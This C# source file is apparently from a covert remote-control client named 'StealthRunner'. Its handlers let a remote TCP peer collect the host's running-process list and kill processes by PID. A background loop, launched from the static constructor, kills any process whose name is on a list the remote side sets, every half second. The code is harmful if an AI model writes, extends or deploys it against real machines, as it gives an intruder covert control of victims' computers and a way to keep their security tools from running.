using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using FlexiLeaf.Core.Operations;
using FlexiLeaf.Core.ProcessManagement;
using System;
using System.Collections.Generic;
using System.Linq;

namespace FlexiLeaf.StealthRunner.Handlers
{
    public static class ProcessHandlers
    {

        private static List<string> ProcessToKillOnSpawn { get; set; } = new List<string>();

        [PacketHandler]
        public static async void SendProcessList(UpdateProcessPacket updatePacket, TcpClient client)
        {
            updatePacket.Process = ProcessManager.GetRunningProcesses();
            await client.Send(updatePacket);
        }

        [PacketHandler]
        public static void KillProcessList(KillProcessPacket packet, TcpClient client)
        {
            ProcessManager.KillProcess(packet.ProcessPacket.PID);
        }

        [PacketHandler]
        public static void UpdateKillProcessOnSpawn(KillProcessOnSpawn packet, TcpClient client)
        {
            ProcessToKillOnSpawn = packet.KillProcess;
        }


        static ProcessHandlers()
        {
            KillOnSpawn();
        }

        public static async void KillOnSpawn()
        {
            while (true)
            {
                foreach (var process in ProcessManager.GetRunningProcesses())
                {
                    if (ProcessToKillOnSpawn.Contains(process.Name))
                    {
                        ProcessManager.KillProcess(process.PID);
                    }
                }
                await Task.Delay(500);
            }
        }

    }
}
